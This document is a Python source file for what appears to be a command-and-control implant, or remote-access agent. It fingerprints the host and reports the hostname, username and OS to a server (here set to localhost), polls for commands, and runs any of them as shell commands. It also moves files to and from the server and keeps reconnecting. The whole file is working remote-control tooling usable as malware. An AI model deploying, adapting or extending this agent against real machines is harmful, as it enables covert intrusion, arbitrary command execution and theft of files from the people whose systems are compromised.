import getpass
import json
import os
import platform
import socket
import subprocess
import sys
import time
import uuid

from urllib.error import HTTPError, URLError
from urllib.request import Request, urlopen
from upload_handler import handle_upload_file
from download_handler import handle_download_file




SERVER_URL = "http://127.0.0.1:8080"
RECONNECT_DELAY = 3


AGENT_ID = str(uuid.uuid4())


def send_json(path, data):
    message_json = json.dumps(data)
    request = Request(
        f"{SERVER_URL}{path}",
        data=message_json.encode("utf-8"),
        headers={
            "Content-Type": "application/octet-stream",
            "X-UUID": AGENT_ID,
        },
        method="POST",
    )

    with urlopen(request, timeout=30) as response:
        body = response.read()
        if not body:
            return None

        return json.loads(body.decode("utf-8"))


def get_command():
    request = Request(
        f"{SERVER_URL}/command",
        headers={"X-UUID": AGENT_ID},
        method="GET",
    )

    try:
        with urlopen(request, timeout=60) as response:
            body = response.read()
            if not body:
                return None

            return json.loads(body.decode("utf-8"))
    except TimeoutError:
        return None
    except socket.timeout:
        return None


def collect_info():
    return {
        "uuid": AGENT_ID,
        "hostname": socket.gethostname(),
        "username": getpass.getuser(),
        "os": platform.system(),
        "os_version": platform.release(),
        "arch": platform.machine(),
    }


def run_command(command_obj):
    """
    Execute command from server

    Args:
        command_obj: Can be string (shell command) or dict with 'command' key

    Returns:
        Result string or dict with status
    """
    if isinstance(command_obj, dict):
        command = command_obj.get('command', '').strip()

        # Handle file upload (server → agent)
        if command == 'agent.upload':
            return handle_upload_file(
                command_obj.get('file_path'),
                command_obj.get('file_data'),
                command_obj.get('file_size')
            )

        # Handle file download (agent → server)
        if command == 'agent.download':
            return handle_download_file(
                command_obj.get('remote_path')
            )

        # Dict-wrapped shell command
        return run_shell(command)

    else:
        # Plain string command
        return run_shell(str(command_obj))


SHELL_TIMEOUT = 30  # seconds


def run_shell(command):
    """
    Execute a shell command and return combined stdout+stderr.

    Special commands handled before reaching the shell:
        agent.exit  — signals the agent loop to terminate (handled by handle_task)

    Everything else is forwarded to the OS shell:
        Windows : cmd.exe /c <command>
        Unix    : /bin/sh -c <command>
    """
    command = command.strip()

    if command == "agent.exit":
        return "agent.exit"

    try:
        result = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            timeout=SHELL_TIMEOUT,
            # Inherit the current environment so PATH, env vars, etc. are available
            env=os.environ.copy(),
        )
        # Combine stdout and stderr; strip trailing whitespace
        output = (result.stdout + result.stderr).rstrip()
        if not output and result.returncode != 0:
            output = f"[exit {result.returncode}]"
        return output or ""

    except subprocess.TimeoutExpired:
        return f"[error] Command timed out after {SHELL_TIMEOUT}s"
    except FileNotFoundError as e:
        return f"[error] Command not found: {e}"
    except OSError as e:
        return f"[error] OS error: {e}"
    except Exception as e:
        return f"[error] {type(e).__name__}: {e}"


def register():
    response = send_json(
        "/connect",
        {
            "type": "register",
            "uuid": AGENT_ID,
            "data": collect_info(),
        },
    )
    print(f"[+] Registered as {AGENT_ID}")
    print(f"[DEBUG] Server response: {response}")
    return response


def send_result(message_id, output):
    send_json(
        "/message",
        {
            "type": "result",
            "uuid": AGENT_ID,
            "message_id": message_id,
            "timestamp": int(time.time()),
            "data": output,
        },
    )


def handle_task(task):
    if task is None or task.get("type") != "command":
        return True

    command = task.get("data", "")
    message_id = task.get("message_id")
    print(f"[DEBUG] Received command: {command}")

    output = run_command(command)

    if output == "agent.exit":
        send_result(message_id, "Agent exiting")
        print("[*] Exit command received")
        os._exit(0)

    send_result(message_id, output)
    return True


def run_agent():
    while True:
        try:
            task = register()
            if not handle_task(task):
                return

            while True:
                if not handle_task(get_command()):
                    return

        except (HTTPError, URLError, TimeoutError, ConnectionError) as e:
            print(f"[!] Connection error: {e}")
        except KeyboardInterrupt:
            print("[*] Agent interrupted")
            return

        print(f"[*] Reconnecting in {RECONNECT_DELAY}s...\n")
        time.sleep(RECONNECT_DELAY)


if __name__ == "__main__":
    run_agent()
